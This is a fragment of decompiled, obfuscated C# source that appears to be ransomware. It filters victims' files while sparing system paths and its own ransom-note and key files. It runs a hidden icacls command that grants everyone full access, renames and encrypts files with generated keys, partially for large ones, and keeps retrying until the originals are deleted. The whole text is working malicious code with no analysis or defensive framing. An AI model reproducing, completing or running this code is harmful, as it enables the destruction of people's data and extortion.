        public void \u003CCrypt\u003Eb__2a() => BErRpdYOfQAwSr.zyEnlTcIHqYR(this.GEoFpfKGMjKCZwQ, this.PgEGNEZOzoH.wvBPXomTVGYyo, this.PgEGNEZOzoH.jhLgXzNXSRNS, this.PgEGNEZOzoH.ZxnwAJqsazOQUB, this.PgEGNEZOzoH.PzYMtvwFVOWwOfS);
      }
    }

    private sealed class JysbNTrlmOEbMFT
    {
      public List<string> BFhdaeESOcRrvA;
      public List<string> TEsRQlBGMsrM;
      public string zRrhleDkDu;
      public string[] YgvmapaKkT;
      public string FYndIeNOJJCR;

      public void \u003CWorkerCrypter2\u003Eb__36([In] string obj0)
      {
        foreach (string str1 in this.TEsRQlBGMsrM)
        {
          if (!str1.ToLower().Contains(":\\program files\\") && !str1.ToLower().Contains(":\\windows\\") && !str1.ToLower().Contains("perflogs") && !str1.ToLower().Contains("internet explorer") && !str1.ToLower().Contains(":\\programdata\\") && !str1.ToLower().Contains("appdata") && !str1.ToLower().Contains("msocache") && !str1.ToLower().Contains("system volume information") && !str1.ToLower().Contains("boot") && !str1.ToLower().Contains("tor browser") && !str1.ToLower().Contains("mozilla") && !str1.ToLower().Contains("google chrome") && !str1.ToLower().Contains("application data") && !str1.Contains("autoexec.bat") && !str1.Contains("desktop.ini") && !str1.Contains("autorun.inf") && !str1.Contains("ntuser.dat") && !str1.Contains("NTUSER.DAT") && !str1.Contains("iconcache.db") && !str1.Contains("bootsect.bak") && !str1.Contains("boot.ini") && !str1.Contains("ntuser.dat.log") && !str1.Contains("thumbs.db") && !str1.ToLower().Contains("bootmgr") && !str1.ToLower().Contains("pagefile.sys") && !str1.ToLower().Contains("config.sys") && !str1.ToLower().Contains("ntuser.ini") && !str1.Contains(BErRpdYOfQAwSr.oMKRHTBqYRfOk("QnVpbGRlcl9Mb2c=")) && !str1.Contains("RSAKeys") && !str1.Contains("Инструкция") && !str1.EndsWith(this.zRrhleDkDu) && !str1.EndsWith("exe") && !str1.EndsWith("dll") && !str1.EndsWith("EXE") && !str1.EndsWith("DLL") && !str1.Contains("Recycle.Bin") && !str1.Contains(BErRpdYOfQAwSr.SGHDaCxgQr) && !str1.Contains(BErRpdYOfQAwSr.OpWBXzCwVRYsxq) && !str1.Contains(BErRpdYOfQAwSr.MwUDomDUGsVhYA))
          {
            if (this.YgvmapaKkT.Length != 0)
            {
              foreach (string str2 in this.YgvmapaKkT)
              {
                if (str1.EndsWith(str2))
                  goto label_68;
              }
            }
            try
            {
              if (str1.EndsWith(this.zRrhleDkDu))
                goto label_68;
            }
            catch (Exception ex)
            {
              goto label_68;
            }
            if (str1.EndsWith(obj0) && !BErRpdYOfQAwSr.TZzJBVGXhjZB.Contains(str1))
            {
              if (BErRpdYOfQAwSr.NvrJrGCLFM == "YES")
              {
                try
                {
                  if (mNZEakGpRFrLn.BzymlTUToS(str1))
                    mNZEakGpRFrLn.yMPBlYJpSCfxjv(str1);
                }
                catch
                {
                }
              }
              BErRpdYOfQAwSr.TZzJBVGXhjZB.Add(str1);
              if (!BErRpdYOfQAwSr.igfzwruhwWDXY.Contains(Path.GetDirectoryName(str1)))
                BErRpdYOfQAwSr.igfzwruhwWDXY.Add(Path.GetDirectoryName(str1));
              BErRpdYOfQAwSr.uATAppcKlZ(BErRpdYOfQAwSr.oMKRHTBqYRfOk("aWNhY2xzLmV4ZQ=="), str1 + BErRpdYOfQAwSr.oMKRHTBqYRfOk("IC9ncmFudCBFdmVyeW9uZTpGIC9UIC9DIC9R"));
              BErRpdYOfQAwSr.eIGoCSnmXvMXP(str1);
              try
              {
                try
                {
                  if (new FileInfo(str1).Length == 0L)
                    continue;
                }
                catch (Exception ex1)
                {
                  if (BErRpdYOfQAwSr.vQOhJPfkmenqxsh)
                  {
                    try
                    {
                      System.IO.File.AppendAllText(BErRpdYOfQAwSr.OpWBXzCwVRYsxq, "File: " + str1 + " - Error while reading if filesize is zero: " + ex1.Message + "\r\n");
                      continue;
                    }
                    catch (Exception ex2)
                    {
                      continue;
                    }
                  }
                  else
                    continue;
                }
                if (BErRpdYOfQAwSr.YvhlPQrYyPhB == "YES" && new FileInfo(str1).Length > (long) (Convert.ToInt32(BErRpdYOfQAwSr.XZspBinZvbc) * 1024 * 1024) && !this.BFhdaeESOcRrvA.Contains(obj0))
                {
                  ThreadStart start = (ThreadStart) null;
                  BErRpdYOfQAwSr.JysbNTrlmOEbMFT.mNXDErnWhYhfY mNxdErnWhYhfY = new BErRpdYOfQAwSr.JysbNTrlmOEbMFT.mNXDErnWhYhfY();
                  mNxdErnWhYhfY.YSfXkLqrELo = this;
                  try
                  {
                    if (this.zRrhleDkDu != ".*")
                      System.IO.File.Move(str1, str1 + this.zRrhleDkDu);
                  }
                  catch (Exception ex3)
                  {
                    if (!BErRpdYOfQAwSr.vQOhJPfkmenqxsh)
                      break;
                    try
                    {
                      System.IO.File.AppendAllText(BErRpdYOfQAwSr.OpWBXzCwVRYsxq, "File: " + str1 + " - Error while renaming to crypted extension: " + ex3.Message + "\r\n");
                      break;
                    }
                    catch (Exception ex4)
                    {
                      break;
                    }
                  }
                  mNxdErnWhYhfY.ZWmcWGCVMBMv = "";
                  mNxdErnWhYhfY.ZWmcWGCVMBMv = !(this.zRrhleDkDu != ".*") ? str1 : str1 + this.zRrhleDkDu;
                  if (BErRpdYOfQAwSr.XiSfijQzOr == "YES")
                  {
                    if (start == null)
                      start = new ThreadStart(mNxdErnWhYhfY.\u003CWorkerCrypter2\u003Eb__37);
                    new Thread(start)
                    {
                      Priority = ThreadPriority.Normal,
                      IsBackground = false
                    }.Start();
                  }
                  string s = mDLVsqYWEGph.lQJZvHOKRcdPe(32);
                  byte[] bytes = Encoding.ASCII.GetBytes(HAbvOFkMJVoSN.IOEmPutvAYpeIgr(s));
                  byte[] numArray = luIgktEtlHVR.sjLnWbxhrKF(mNxdErnWhYhfY.ZWmcWGCVMBMv, Convert.ToInt32(BErRpdYOfQAwSr.XZspBinZvbc) * 1024 * 1024);
                  byte[] DWszvBlRCViF;
                  if (!BErRpdYOfQAwSr.sWEYqVGQKvAbKzrbA)
                  {
                    if (!BErRpdYOfQAwSr.txjxRPsHuzRR)
                      DWszvBlRCViF = luIgktEtlHVR.ZnyJbIPDofh(numArray, Encoding.ASCII.GetBytes(this.FYndIeNOJJCR), new byte[8]
                      {
                        (byte) 1,
                        (byte) 2,
                        (byte) 3,
                        (byte) 4,
                        (byte) 5,
                        (byte) 6,
                        (byte) 7,
                        (byte) 8
                      });
                    else
                      DWszvBlRCViF = luIgktEtlHVR.ZnyJbIPDofh(numArray, Encoding.ASCII.GetBytes(s), new byte[8]
                      {
                        (byte) 1,
                        (byte) 2,
                        (byte) 3,
                        (byte) 4,
                        (byte) 5,
                        (byte) 6,
                        (byte) 7,
                        (byte) 8
                      });
                  }
                  else if (!BErRpdYOfQAwSr.txjxRPsHuzRR)
                    DWszvBlRCViF = rkaJvaLxSApP.XSSYjgejGHjLCQ(numArray, Encoding.ASCII.GetBytes(this.FYndIeNOJJCR), new byte[8]
                    {
                      (byte) 1,
                      (byte) 2,
                      (byte) 3,
                      (byte) 4,
                      (byte) 5,
                      (byte) 6,
                      (byte) 7,
                      (byte) 8
                    });
                  else
                    DWszvBlRCViF = rkaJvaLxSApP.XSSYjgejGHjLCQ(numArray, Encoding.ASCII.GetBytes(s), new byte[8]
                    {
                      (byte) 1,
                      (byte) 2,
                      (byte) 3,
                      (byte) 4,
                      (byte) 5,
                      (byte) 6,
                      (byte) 7,
                      (byte) 8
                    });
                  luIgktEtlHVR.SEcBXBtSwKeqJ(mNxdErnWhYhfY.ZWmcWGCVMBMv, DWszvBlRCViF, bytes);
                }
                else
                {
                  string s = mDLVsqYWEGph.lQJZvHOKRcdPe(32);
                  byte[] bytes = Encoding.ASCII.GetBytes(HAbvOFkMJVoSN.IOEmPutvAYpeIgr(s));
                  if (this.zRrhleDkDu != ".*")
                  {
                    if (!BErRpdYOfQAwSr.kqkNEUMWxoNDeP)
                    {
                      if (!BErRpdYOfQAwSr.txjxRPsHuzRR)
                        BErRpdYOfQAwSr.IbxvsuFDJGCHw(str1, str1 + this.zRrhleDkDu, BErRpdYOfQAwSr.vzfvEbaMMJjzL);
                      else
                        BErRpdYOfQAwSr.IbxvsuFDJGCHw(str1, str1 + this.zRrhleDkDu, Encoding.ASCII.GetBytes(s));
                    }
                    else
                    {
                      try
                      {
                        if (!BErRpdYOfQAwSr.txjxRPsHuzRR)
                          BErRpdYOfQAwSr.aaxjshgqLTvRmFF(str1, str1 + this.zRrhleDkDu, BErRpdYOfQAwSr.vzfvEbaMMJjzL);
                        else
                          BErRpdYOfQAwSr.aaxjshgqLTvRmFF(str1, str1 + this.zRrhleDkDu, Encoding.ASCII.GetBytes(s));
                      }
                      catch (Exception ex5)
                      {
                        if (BErRpdYOfQAwSr.vQOhJPfkmenqxsh)
                        {
                          try
                          {
                            System.IO.File.AppendAllText(BErRpdYOfQAwSr.OpWBXzCwVRYsxq, "File: " + str1 + " - Error while fully writing to file: " + ex5.Message + "\r\n");
                          }
                          catch (Exception ex6)
                          {
                          }
                        }
                      }
                    }
                  }
                  else if (!BErRpdYOfQAwSr.kqkNEUMWxoNDeP)
                  {
                    if (!BErRpdYOfQAwSr.txjxRPsHuzRR)
                      BErRpdYOfQAwSr.IbxvsuFDJGCHw(str1, str1 + ".part", BErRpdYOfQAwSr.vzfvEbaMMJjzL);
                    else
                      BErRpdYOfQAwSr.IbxvsuFDJGCHw(str1, str1 + ".part", Encoding.ASCII.GetBytes(s));
                  }
                  else
                  {
                    try
                    {
                      if (!BErRpdYOfQAwSr.txjxRPsHuzRR)
                        BErRpdYOfQAwSr.aaxjshgqLTvRmFF(str1, str1, BErRpdYOfQAwSr.vzfvEbaMMJjzL);
                      else
                        BErRpdYOfQAwSr.aaxjshgqLTvRmFF(str1, str1, Encoding.ASCII.GetBytes(s));
                    }
                    catch (Exception ex7)
                    {
                      if (BErRpdYOfQAwSr.vQOhJPfkmenqxsh)
                      {
                        try
                        {
                          System.IO.File.AppendAllText(BErRpdYOfQAwSr.OpWBXzCwVRYsxq, "File: " + str1 + " - Error while fully writing to file: " + ex7.Message + "\r\n");
                        }
                        catch (Exception ex8)
                        {
                        }
                      }
                    }
                  }
                  if (BErRpdYOfQAwSr.txjxRPsHuzRR)
                  {
                    if (this.zRrhleDkDu != ".*")
                      BErRpdYOfQAwSr.lPoyIxkPQfSfzaP(str1 + this.zRrhleDkDu, bytes);
                    else
                      BErRpdYOfQAwSr.lPoyIxkPQfSfzaP(str1, bytes);
                  }
                }
              }
              catch (Exception ex)
              {
              }
            }
            else
              continue;
label_68:
            this.TEsRQlBGMsrM.Remove(str1);
          }
        }
      }

      public void \u003CWorkerCrypter2\u003Eb__38([In] string obj0)
      {
        ThreadStart start = (ThreadStart) null;
        BErRpdYOfQAwSr.JysbNTrlmOEbMFT.YkvZynJxzmMAMM ykvZynJxzmMamm = new BErRpdYOfQAwSr.JysbNTrlmOEbMFT.YkvZynJxzmMAMM();
        ykvZynJxzmMamm.YSfXkLqrELo = this;
        ykvZynJxzmMamm.FGDbrdTLEwF = obj0;
        if (!ykvZynJxzmMamm.FGDbrdTLEwF.ToLower().Contains(":\\program files\\") && !ykvZynJxzmMamm.FGDbrdTLEwF.ToLower().Contains(":\\windows\\") && !ykvZynJxzmMamm.FGDbrdTLEwF.ToLower().Contains("perflogs") && !ykvZynJxzmMamm.FGDbrdTLEwF.ToLower().Contains("internet explorer") && !ykvZynJxzmMamm.FGDbrdTLEwF.ToLower().Contains(":\\programdata\\") && !ykvZynJxzmMamm.FGDbrdTLEwF.ToLower().Contains("appdata") && !ykvZynJxzmMamm.FGDbrdTLEwF.ToLower().Contains("msocache") && !ykvZynJxzmMamm.FGDbrdTLEwF.ToLower().Contains("system volume information") && !ykvZynJxzmMamm.FGDbrdTLEwF.ToLower().Contains("boot") && !ykvZynJxzmMamm.FGDbrdTLEwF.ToLower().Contains("tor browser") && !ykvZynJxzmMamm.FGDbrdTLEwF.ToLower().Contains("mozilla") && !ykvZynJxzmMamm.FGDbrdTLEwF.ToLower().Contains("google chrome") && !ykvZynJxzmMamm.FGDbrdTLEwF.ToLower().Contains("application data") && !ykvZynJxzmMamm.FGDbrdTLEwF.Contains("autoexec.bat") && !ykvZynJxzmMamm.FGDbrdTLEwF.Contains("desktop.ini") && !ykvZynJxzmMamm.FGDbrdTLEwF.Contains("autorun.inf") && !ykvZynJxzmMamm.FGDbrdTLEwF.Contains("ntuser.dat") && !ykvZynJxzmMamm.FGDbrdTLEwF.Contains("NTUSER.DAT") && !ykvZynJxzmMamm.FGDbrdTLEwF.Contains("iconcache.db") && !ykvZynJxzmMamm.FGDbrdTLEwF.Contains("bootsect.bak") && !ykvZynJxzmMamm.FGDbrdTLEwF.Contains("boot.ini") && !ykvZynJxzmMamm.FGDbrdTLEwF.Contains("ntuser.dat.log") && !ykvZynJxzmMamm.FGDbrdTLEwF.Contains("thumbs.db") && !ykvZynJxzmMamm.FGDbrdTLEwF.ToLower().Contains("bootmgr") && !ykvZynJxzmMamm.FGDbrdTLEwF.ToLower().Contains("pagefile.sys") && !ykvZynJxzmMamm.FGDbrdTLEwF.ToLower().Contains("config.sys") && !ykvZynJxzmMamm.FGDbrdTLEwF.ToLower().Contains("ntuser.ini") && !ykvZynJxzmMamm.FGDbrdTLEwF.Contains(BErRpdYOfQAwSr.oMKRHTBqYRfOk("QnVpbGRlcl9Mb2c=")) && !ykvZynJxzmMamm.FGDbrdTLEwF.Contains("RSAKeys") && !ykvZynJxzmMamm.FGDbrdTLEwF.Contains("Инструкция") && !ykvZynJxzmMamm.FGDbrdTLEwF.EndsWith(this.zRrhleDkDu) && !ykvZynJxzmMamm.FGDbrdTLEwF.EndsWith("exe") && !ykvZynJxzmMamm.FGDbrdTLEwF.EndsWith("dll") && !ykvZynJxzmMamm.FGDbrdTLEwF.EndsWith("EXE") && !ykvZynJxzmMamm.FGDbrdTLEwF.EndsWith("DLL") && !ykvZynJxzmMamm.FGDbrdTLEwF.Contains("Recycle.Bin") && !ykvZynJxzmMamm.FGDbrdTLEwF.Contains(BErRpdYOfQAwSr.SGHDaCxgQr) && !ykvZynJxzmMamm.FGDbrdTLEwF.Contains(BErRpdYOfQAwSr.OpWBXzCwVRYsxq) && !ykvZynJxzmMamm.FGDbrdTLEwF.Contains(BErRpdYOfQAwSr.MwUDomDUGsVhYA))
        {
          if (this.YgvmapaKkT.Length != 0)
          {
            foreach (string str in this.YgvmapaKkT)
            {
              if (ykvZynJxzmMamm.FGDbrdTLEwF.EndsWith(str))
                goto label_68;
            }
          }
          try
          {
            if (ykvZynJxzmMamm.FGDbrdTLEwF.EndsWith(this.zRrhleDkDu))
              goto label_68;
          }
          catch (Exception ex)
          {
            goto label_68;
          }
          if (!BErRpdYOfQAwSr.TZzJBVGXhjZB.Contains(ykvZynJxzmMamm.FGDbrdTLEwF))
          {
            if (BErRpdYOfQAwSr.NvrJrGCLFM == "YES")
            {
              try
              {
                if (mNZEakGpRFrLn.BzymlTUToS(ykvZynJxzmMamm.FGDbrdTLEwF))
                  mNZEakGpRFrLn.yMPBlYJpSCfxjv(ykvZynJxzmMamm.FGDbrdTLEwF);
              }
              catch
              {
              }
            }
            BErRpdYOfQAwSr.TZzJBVGXhjZB.Add(ykvZynJxzmMamm.FGDbrdTLEwF);
            if (!BErRpdYOfQAwSr.igfzwruhwWDXY.Contains(Path.GetDirectoryName(ykvZynJxzmMamm.FGDbrdTLEwF)))
              BErRpdYOfQAwSr.igfzwruhwWDXY.Add(Path.GetDirectoryName(ykvZynJxzmMamm.FGDbrdTLEwF));
            BErRpdYOfQAwSr.eIGoCSnmXvMXP(ykvZynJxzmMamm.FGDbrdTLEwF);
            try
            {
              try
              {
                if (new FileInfo(ykvZynJxzmMamm.FGDbrdTLEwF).Length == 0L)
                  goto label_68;
              }
              catch (Exception ex1)
              {
                if (BErRpdYOfQAwSr.vQOhJPfkmenqxsh)
                {
                  try
                  {
                    System.IO.File.AppendAllText(BErRpdYOfQAwSr.OpWBXzCwVRYsxq, "File: " + ykvZynJxzmMamm.FGDbrdTLEwF + " - Error while reading if filesize is zero: " + ex1.Message + "\r\n");
                    goto label_68;
                  }
                  catch (Exception ex2)
                  {
                    goto label_68;
                  }
                }
                else
                  goto label_68;
              }
              if (BErRpdYOfQAwSr.YvhlPQrYyPhB == "YES")
              {
                if (new FileInfo(ykvZynJxzmMamm.FGDbrdTLEwF).Length > (long) (Convert.ToInt32(BErRpdYOfQAwSr.XZspBinZvbc) * 1024 * 1024))
                {
                  try
                  {
                    if (this.zRrhleDkDu != ".*")
                      System.IO.File.Move(ykvZynJxzmMamm.FGDbrdTLEwF, ykvZynJxzmMamm.FGDbrdTLEwF + this.zRrhleDkDu);
                  }
                  catch (Exception ex3)
                  {
                    if (!BErRpdYOfQAwSr.vQOhJPfkmenqxsh)
                      return;
                    try
                    {
                      System.IO.File.AppendAllText(BErRpdYOfQAwSr.OpWBXzCwVRYsxq, "File: " + ykvZynJxzmMamm.FGDbrdTLEwF + " - Error while renaming to crypted extension: " + ex3.Message + "\r\n");
                      return;
                    }
                    catch (Exception ex4)
                    {
                      return;
                    }
                  }
                  if (this.zRrhleDkDu != ".*")
                    ykvZynJxzmMamm.FGDbrdTLEwF += this.zRrhleDkDu;
                  if (BErRpdYOfQAwSr.XiSfijQzOr == "YES")
                  {
                    if (start == null)
                      start = new ThreadStart(ykvZynJxzmMamm.\u003CWorkerCrypter2\u003Eb__39);
                    new Thread(start)
                    {
                      IsBackground = false,
                      Priority = ThreadPriority.Normal
                    }.Start();
                  }
                  string s = mDLVsqYWEGph.lQJZvHOKRcdPe(32);
                  byte[] bytes = Encoding.ASCII.GetBytes(HAbvOFkMJVoSN.IOEmPutvAYpeIgr(s));
                  byte[] numArray = luIgktEtlHVR.sjLnWbxhrKF(ykvZynJxzmMamm.FGDbrdTLEwF, Convert.ToInt32(BErRpdYOfQAwSr.XZspBinZvbc) * 1024 * 1024);
                  byte[] DWszvBlRCViF;
                  if (!BErRpdYOfQAwSr.sWEYqVGQKvAbKzrbA)
                  {
                    if (!BErRpdYOfQAwSr.txjxRPsHuzRR)
                      DWszvBlRCViF = luIgktEtlHVR.ZnyJbIPDofh(numArray, Encoding.ASCII.GetBytes(this.FYndIeNOJJCR), new byte[8]
                      {
                        (byte) 1,
                        (byte) 2,
                        (byte) 3,
                        (byte) 4,
                        (byte) 5,
                        (byte) 6,
                        (byte) 7,
                        (byte) 8
                      });
                    else
                      DWszvBlRCViF = luIgktEtlHVR.ZnyJbIPDofh(numArray, Encoding.ASCII.GetBytes(s), new byte[8]
                      {
                        (byte) 1,
                        (byte) 2,
                        (byte) 3,
                        (byte) 4,
                        (byte) 5,
                        (byte) 6,
                        (byte) 7,
                        (byte) 8
                      });
                  }
                  else if (!BErRpdYOfQAwSr.txjxRPsHuzRR)
                    DWszvBlRCViF = rkaJvaLxSApP.XSSYjgejGHjLCQ(numArray, Encoding.ASCII.GetBytes(this.FYndIeNOJJCR), new byte[8]
                    {
                      (byte) 1,
                      (byte) 2,
                      (byte) 3,
                      (byte) 4,
                      (byte) 5,
                      (byte) 6,
                      (byte) 7,
                      (byte) 8
                    });
                  else
                    DWszvBlRCViF = rkaJvaLxSApP.XSSYjgejGHjLCQ(numArray, Encoding.ASCII.GetBytes(s), new byte[8]
                    {
                      (byte) 1,
                      (byte) 2,
                      (byte) 3,
                      (byte) 4,
                      (byte) 5,
                      (byte) 6,
                      (byte) 7,
                      (byte) 8
                    });
                  luIgktEtlHVR.SEcBXBtSwKeqJ(ykvZynJxzmMamm.FGDbrdTLEwF, DWszvBlRCViF, bytes);
                  goto label_68;
                }
              }
              string s1 = mDLVsqYWEGph.lQJZvHOKRcdPe(32);
              byte[] bytes1 = Encoding.ASCII.GetBytes(HAbvOFkMJVoSN.IOEmPutvAYpeIgr(s1));
              if (this.zRrhleDkDu != ".*")
              {
                if (!BErRpdYOfQAwSr.kqkNEUMWxoNDeP)
                {
                  if (!BErRpdYOfQAwSr.txjxRPsHuzRR)
                    BErRpdYOfQAwSr.IbxvsuFDJGCHw(ykvZynJxzmMamm.FGDbrdTLEwF, ykvZynJxzmMamm.FGDbrdTLEwF + this.zRrhleDkDu, BErRpdYOfQAwSr.vzfvEbaMMJjzL);
                  else
                    BErRpdYOfQAwSr.IbxvsuFDJGCHw(ykvZynJxzmMamm.FGDbrdTLEwF, ykvZynJxzmMamm.FGDbrdTLEwF + this.zRrhleDkDu, Encoding.ASCII.GetBytes(s1));
                }
                else
                {
                  try
                  {
                    if (!BErRpdYOfQAwSr.txjxRPsHuzRR)
                      BErRpdYOfQAwSr.aaxjshgqLTvRmFF(ykvZynJxzmMamm.FGDbrdTLEwF, ykvZynJxzmMamm.FGDbrdTLEwF + this.zRrhleDkDu, BErRpdYOfQAwSr.vzfvEbaMMJjzL);
                    else
                      BErRpdYOfQAwSr.aaxjshgqLTvRmFF(ykvZynJxzmMamm.FGDbrdTLEwF, ykvZynJxzmMamm.FGDbrdTLEwF + this.zRrhleDkDu, Encoding.ASCII.GetBytes(s1));
                  }
                  catch (Exception ex5)
                  {
                    if (BErRpdYOfQAwSr.vQOhJPfkmenqxsh)
                    {
                      try
                      {
                        System.IO.File.AppendAllText(BErRpdYOfQAwSr.OpWBXzCwVRYsxq, "File: " + ykvZynJxzmMamm.FGDbrdTLEwF + " - Error while fully writing to file: " + ex5.Message + "\r\n");
                      }
                      catch (Exception ex6)
                      {
                      }
                    }
                  }
                }
              }
              else if (!BErRpdYOfQAwSr.kqkNEUMWxoNDeP)
              {
                if (!BErRpdYOfQAwSr.txjxRPsHuzRR)
                  BErRpdYOfQAwSr.IbxvsuFDJGCHw(ykvZynJxzmMamm.FGDbrdTLEwF, ykvZynJxzmMamm.FGDbrdTLEwF + ".part", BErRpdYOfQAwSr.vzfvEbaMMJjzL);
                else
                  BErRpdYOfQAwSr.IbxvsuFDJGCHw(ykvZynJxzmMamm.FGDbrdTLEwF, ykvZynJxzmMamm.FGDbrdTLEwF + ".part", Encoding.ASCII.GetBytes(s1));
              }
              else
              {
                try
                {
                  if (!BErRpdYOfQAwSr.txjxRPsHuzRR)
                    BErRpdYOfQAwSr.aaxjshgqLTvRmFF(ykvZynJxzmMamm.FGDbrdTLEwF, ykvZynJxzmMamm.FGDbrdTLEwF, BErRpdYOfQAwSr.vzfvEbaMMJjzL);
                  else
                    BErRpdYOfQAwSr.aaxjshgqLTvRmFF(ykvZynJxzmMamm.FGDbrdTLEwF, ykvZynJxzmMamm.FGDbrdTLEwF, Encoding.ASCII.GetBytes(s1));
                }
                catch (Exception ex7)
                {
                  if (BErRpdYOfQAwSr.vQOhJPfkmenqxsh)
                  {
                    try
                    {
                      System.IO.File.AppendAllText(BErRpdYOfQAwSr.OpWBXzCwVRYsxq, "File: " + ykvZynJxzmMamm.FGDbrdTLEwF + " - Error while fully writing to file: " + ex7.Message + "\r\n");
                    }
                    catch (Exception ex8)
                    {
                    }
                  }
                }
              }
              if (BErRpdYOfQAwSr.txjxRPsHuzRR)
              {
                if (this.zRrhleDkDu != ".*")
                  BErRpdYOfQAwSr.lPoyIxkPQfSfzaP(ykvZynJxzmMamm.FGDbrdTLEwF + this.zRrhleDkDu, bytes1);
                else
                  BErRpdYOfQAwSr.lPoyIxkPQfSfzaP(ykvZynJxzmMamm.FGDbrdTLEwF, bytes1);
              }
            }
            catch (Exception ex)
            {
            }
          }
        }
label_68:
        this.TEsRQlBGMsrM.Remove(ykvZynJxzmMamm.FGDbrdTLEwF);
      }

      private sealed class mNXDErnWhYhfY
      {
        public BErRpdYOfQAwSr.JysbNTrlmOEbMFT YSfXkLqrELo;
        public string ZWmcWGCVMBMv;

        public void \u003CWorkerCrypter2\u003Eb__37()
        {
          foreach (string str in BErRpdYOfQAwSr.HLlzhaBALyehKMW)
          {
            if (this.ZWmcWGCVMBMv.ToLower().EndsWith(str + this.YSfXkLqrELo.zRrhleDkDu) && BErRpdYOfQAwSr.LNfftKTeaLEJxe == "YES")
            {
              if ((long) (Convert.ToInt32(BErRpdYOfQAwSr.jUyryfTlTABVm) * 1024 * 1024) > new FileInfo(this.ZWmcWGCVMBMv).Length)
              {
                try
                {
                  BhEjWEybWo.UKsatUgrFHrdZ(FsNymxUZdUYu: this.ZWmcWGCVMBMv);
                }
                catch
                {
                }
              }
            }
            else if (this.ZWmcWGCVMBMv.ToLower().EndsWith(str))
            {
              if (BErRpdYOfQAwSr.LNfftKTeaLEJxe == "NO")
              {
                try
                {
                  BhEjWEybWo.UKsatUgrFHrdZ(FsNymxUZdUYu: this.ZWmcWGCVMBMv);
                }
                catch
                {
                }
              }
            }
          }
        }
      }

      private sealed class YkvZynJxzmMAMM
      {
        public BErRpdYOfQAwSr.JysbNTrlmOEbMFT YSfXkLqrELo;
        public string FGDbrdTLEwF;

        public void \u003CWorkerCrypter2\u003Eb__39()
        {
          foreach (string str in BErRpdYOfQAwSr.HLlzhaBALyehKMW)
          {
            if (this.FGDbrdTLEwF.ToLower().EndsWith(str + this.YSfXkLqrELo.zRrhleDkDu) && BErRpdYOfQAwSr.LNfftKTeaLEJxe == "YES")
            {
              if ((long) (Convert.ToInt32(BErRpdYOfQAwSr.jUyryfTlTABVm) * 1024 * 1024) > new FileInfo(this.FGDbrdTLEwF).Length)
              {
                try
                {
                  BhEjWEybWo.UKsatUgrFHrdZ(FsNymxUZdUYu: this.FGDbrdTLEwF);
                }
                catch
                {
                }
              }
            }
            else if (this.FGDbrdTLEwF.ToLower().EndsWith(str))
            {
              if (BErRpdYOfQAwSr.LNfftKTeaLEJxe == "NO")
              {
                try
                {
                  BhEjWEybWo.UKsatUgrFHrdZ(FsNymxUZdUYu: this.FGDbrdTLEwF);
                }
                catch
                {
                }
              }
            }
          }
        }
      }
    }

    private sealed class tsCGCqSymQuu
    {
      public string UZavYxvKDEAva;
      public string vxjqxeajvIhW;

      public void \u003CEncrypt2\u003Eb__46()
      {
        while (true)
        {
          try
          {
            System.IO.File.Delete(this.UZavYxvKDEAva);
            break;
          }
          catch
          {
            Thread.Sleep(1500);
          }
        }
      }

      public void \u003CEncrypt2\u003Eb__47()
      {
        while (true)
        {
          try
          {
            if (!System.IO.File.Exists(this.vxjqxeajvIhW))
              break;
            System.IO.File.Delete(this.vxjqxeajvIhW);
            break;
          }
          catch
          {
            Thread.Sleep(1500);
          }
        }
      }
    }
  }
}
